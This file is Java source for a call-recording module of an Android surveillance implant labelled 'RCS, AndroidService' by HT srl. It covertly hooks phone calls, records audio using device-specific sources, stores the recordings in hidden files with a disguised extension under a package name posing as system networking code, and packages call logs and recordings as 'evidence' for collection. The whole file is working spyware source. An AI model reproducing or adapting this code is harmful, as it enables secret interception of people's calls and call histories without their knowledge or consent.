/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module;

import java.io.File;
import java.util.HashMap;
import java.util.concurrent.TimeUnit;

import android.media.MediaRecorder;
import android.os.Build;

import com.android.networking.Call;
import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.conf.ConfigurationException;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.Markup;
import com.android.networking.file.AutoFile;
import com.android.networking.file.Path;
import com.android.networking.interfaces.Observer;
import com.android.networking.listener.ListenerCall;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.DataBuffer;
import com.android.networking.util.DateTime;
import com.android.networking.util.WChar;

public class ModuleCall extends BaseModule implements Observer<Call> {
	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
	private static final int HEADER_SIZE = 6;
	private MediaRecorder recorder = null;
	private boolean record;
	private String currentRecordFile;
	private DateTime from;
	private String number, model;
	private int strategy = 0;

	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };

	@Override
	public boolean parse(ConfModule conf) {
		if (conf.has("record")) {
			try {
				record = conf.getBoolean("record");
			} catch (ConfigurationException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				record = false;
			}
		}

		return true;
	}

	@Override
	public void actualGo() {

	}

	@Override
	public void actualStart() {
		ListenerCall.self().attach(this);

		if (record) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart): recording calls"); //$NON-NLS-1$
			}
		}
	}

	@Override
	public void actualStop() {
		ListenerCall.self().detach(this);
	}

	public int notification(final Call call) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): number: " + call.getNumber()); //$NON-NLS-1$
		}

		if (call.isComplete() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): call not yet established"); //$NON-NLS-1$
			}

			return 0;
		}

		final boolean incoming = call.isIncoming();

		if (call.isOngoing()) {
			// save date and number
			from = new DateTime(call.getTimestamp());
			number = call.getNumber();
		}

		final DateTime to = new DateTime(call.getTimestamp());

		// Let's start with call recording
		if (record && isSupported()) {
			if (!call.isOngoing()) {
				if (stopRecord()) {
					Object future = Status.self().getStpe().schedule(new Runnable() {
						public void run() {
							saveCallEvidence(number, incoming, from, to, currentRecordFile);
						}
					}, 100, TimeUnit.MILLISECONDS);
					
					// Se un giorno la conf non dovesse includere gia' tutti i moduli,
					// self() tornerebbe NULL in quanto non instanziato.
					ModuleMic mic = ModuleMic.self();
					
					if (mic != null) {
						mic.resume();
					}
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): call finished"); //$NON-NLS-1$
				}
				
				return 0;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
			}

			int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
			int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;

			Long ts = new Long(System.currentTimeMillis());
			String tmp = ts.toString();
			
			// Logfile .3gpp in chiaro, temporaneo
			String path = Path.hidden() + "/" + tmp + ".qzt";

			ModuleMic mic = ModuleMic.self();
			
			if (mic != null) {
				mic.suspend();
			}
			
			if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
				}

				return 1;
			}
			
			mic = ModuleMic.self();
			
			if (mic != null) {
				mic.resume();
			}
			
		}

		saveCalllistEvidence(number, incoming, from, to);

		return 0;
	}

	private void saveCallEvidence(String number, boolean incoming, DateTime from, DateTime to, String currentRecordFile) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile);
		}

		final byte[] additionaldata = getCallAdditionalData(number, incoming, from, to);

		AutoFile file = new AutoFile(currentRecordFile);
		if (file.exists() && file.getSize() > HEADER_SIZE && file.canRead()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCallEvidence): file size = " + file.getSize());
			}

			int offset = 0;
			byte[] header = file.read(0, 6);

			if (ByteArray.equals(header, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveCallEvidence): AMR header");
				}
				offset = AMR_HEADER.length;
			}
			
			byte[] data = file.read(offset);
			int pos = checkIntegrity(data);
			
			if (pos != data.length) {
				data = ByteArray.copy(data, 0, pos);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
				Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
			}
			
			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, data);
			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCallEvidence): not deleting file: " + file);
			}
			
			file.delete();
		}
	}

	private int checkIntegrity(byte[] data) {
		int pos = 0;
		int chunklen = 0;
		
		while (pos < data.length) {			
			chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];
			
			if (chunklen == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence) Error: zero len amr chunk, pos: " + pos);
				}
			}
			
			pos += chunklen + 1;
		} 

		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkIntegrity): end");
		}
		
		return pos;
	}

	private byte[] getCallAdditionalData(String number, boolean incoming, DateTime from, DateTime to) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getCallAdditionalData): " + number);
		}

		byte[] caller;
		byte[] callee;

		caller = WChar.getBytes("local");
		callee = WChar.getBytes(number);

		final int version = 2008121901; // CALL_LOG_VERSION
		final int program = 0x0145; // LOGTYPE_CALL_MOBILE
		final int LOG_AUDIO_CODEC_AMR = 0x1;
		int channel = 1;
		int sampleRate = 8000 | LOG_AUDIO_CODEC_AMR;

		int len = 20 + 16 + 8 + caller.length + callee.length;
		final byte[] additionaldata = new byte[len];
		final DataBuffer additionalData = new DataBuffer(additionaldata, 0, len);
		additionalData.writeInt(version);
		additionalData.writeInt(channel);
		additionalData.writeInt(program);
		additionalData.writeInt(sampleRate);
		additionalData.writeInt(incoming ? 1 : 0);
		additionalData.writeLong(from.getFiledate());
		additionalData.writeLong(to.getFiledate());

		additionalData.writeInt(caller.length);
		additionalData.writeInt(callee.length);

		additionalData.write(caller);
		additionalData.write(callee);
		return additionaldata;
	}

	private void saveCalllistEvidence(String number, boolean incoming, DateTime from, DateTime to) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveCalllistEvidence): " + number);
		}
		final boolean outgoing = !incoming;
		// final int duration = call.getDuration(call);

		final String name = ""; //$NON-NLS-1$
		final boolean missed = false;
		final String nametype = Messages.getString("7_0"); //$NON-NLS-1$
		final String note = Messages.getString("7_1"); //$NON-NLS-1$

		final int LOG_CALLIST_VERSION = 0;

		int len = 28; // 0x1C;

		len += wsize(number);
		len += wsize(name);
		len += wsize(note);
		len += wsize(nametype);

		final byte[] data = new byte[len];

		final DataBuffer databuffer = new DataBuffer(data, 0, len);

		databuffer.writeInt(len);
		databuffer.writeInt(LOG_CALLIST_VERSION);
		databuffer.writeLong(from.getFiledate());
		databuffer.writeLong(to.getFiledate());

		final int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
		databuffer.writeInt(flags);

		addTypedString(databuffer, (byte) 0x01, name);
		addTypedString(databuffer, (byte) 0x02, nametype);
		addTypedString(databuffer, (byte) 0x04, note);
		addTypedString(databuffer, (byte) 0x08, number);

		EvidenceReference.atomic(EvidenceType.CALLLIST, null, data);
	}

	private boolean isSupported() {
		model = Build.MODEL.toLowerCase();
		boolean supported = false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (isSupported): phone model: " + model); //$NON-NLS-1$
		}
		// TODO: in Messages
		if (model.contains("i9100")) { // Samsung Galaxy S2
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
			}
		} else if (model.contains("galaxy nexus")){ // Samsung Galaxy Nexus
			supported = true;
			strategy = MediaRecorder.AudioSource.DEFAULT;
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Galaxy Nexus, supported only microphone"); //$NON-NLS-1$
			}
		}  else if (model.contains("gt-i9300")){ // Galaxy S3
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Galaxy S3, supported"); //$NON-NLS-1$
			}
		}  else if (model.contains("xt910")){ // Motorola xt-910
			supported = false;
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Motorola xt-910, unsupported"); //$NON-NLS-1$
			}
		}  else if (model.contains("gt-p1000")){ // Samsung Galaxy Tab 7''
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Samsung Galaxy Tab 7'',  supported"); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): model unsupported by call registration module"); //$NON-NLS-1$
			}
		}

		return supported;
	}

	public synchronized static void addTypedString(DataBuffer databuffer, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);
			databuffer.writeInt(header);
			databuffer.write(WChar.getBytes(name));
		}
	}

	private boolean startRecord(int audioSource, int outputFormat, int audioEncoder, String path) {
		recorder = new MediaRecorder();

		recorder.setAudioSource(audioSource);
		recorder.setOutputFormat(outputFormat);
		// REMOVE
		//recorder.setAudioChannels(1);
		
		recorder.setAudioEncoder(audioEncoder);
		recorder.setOutputFile(path);

		try {
			recorder.prepare();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}

		recorder.start();
		currentRecordFile = path;
		return true;
	}

	private boolean stopRecord() {
		if (recorder == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopRecord): recorder is already null"); //$NON-NLS-1$
			}

			return false;
		}

		recorder.stop();
		recorder.release();
		recorder = null;
		return true;
	}


	private int getStrategyNotYetWorking() {
		Markup markupCallStrategy = new Markup(this);
		HashMap<Integer, Boolean> strategyMap = null;

		// the markup exists, try to read it
		try {
			if (markupCallStrategy.isMarkup()) {
				strategyMap = (HashMap<Integer, Boolean>) markupCallStrategy.readMarkupSerializable();
			}

			// First time we run, let's try a strategy
			if (strategyMap == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): no markup found, testing strategies..."); //$NON-NLS-1$
				}

				// Start with strategy 1
				int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
				int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
				boolean res;

				strategyMap = new HashMap<Integer, Boolean>();

				res = testStrategy(MediaRecorder.AudioSource.VOICE_CALL, outputFormat, audioEncoder);

				// Strategy 0x04
				strategyMap.put(MediaRecorder.AudioSource.VOICE_CALL, res);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 4: " + res); //$NON-NLS-1$
				}

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_CALL;
				}

				// Strategy 0x02
				res = testStrategy(MediaRecorder.AudioSource.VOICE_UPLINK, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 2: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.VOICE_UPLINK, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_UPLINK;
				}

				// Strategy 0x03
				res = testStrategy(MediaRecorder.AudioSource.VOICE_DOWNLINK, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 3: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.VOICE_DOWNLINK, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_DOWNLINK;
				}

				// Strategy 0x01
				res = testStrategy(MediaRecorder.AudioSource.MIC, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 1: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.MIC, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.MIC;
				}

				markupCallStrategy.writeMarkupSerializable(strategyMap);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStrategy): no suitable strategy found"); //$NON-NLS-1$
				}
			} else { // Return the winning strategy
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): reading markup"); //$NON-NLS-1$
				}

				for (Integer i : strategyMap.keySet()) {
					boolean testedStrategy = strategyMap.get(i);

					if (testedStrategy == true) {
						// Return the winning strategy
						if (Cfg.DEBUG) {
							Check.log(TAG + " (getStrategy): using strategy  " + i); //$NON-NLS-1$
						}

						return i;
					}
				}

				// Ok we don't have a winning strategy
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStrategy): no strategy found in markup"); //$NON-NLS-1$
				}

				return 0;
			}
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (setStrategy): " + e);//$NON-NLS-1$
			}
		}

		return 0;
	}

	private boolean testStrategy(int audioSource, int outputFormat, int audioEncoder) {
		// Create dummy file
		Long ts = new Long(System.currentTimeMillis());
		String tmp = ts.toString();
		String path = Path.hidden() + "/" + tmp + ".qzt"; // file .3gp
		boolean success = false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (testStrategy): strategy: " + audioSource + " - dummy path: " + path); //$NON-NLS-1$
		}

		startRecord(audioSource, outputFormat, audioEncoder, path);

		// Utils.sleep(250);

		stopRecord();

		File dummy = new File(path);

		if (dummy.length() > 0) {
			success = true;
		}

		dummy.delete();
		dummy = null;

		return success;
	}

	private int wsize(String string) {
		if (string.length() == 0) {
			return 0;
		} else {
			return string.length() * 2 + 4;
		}
	}
}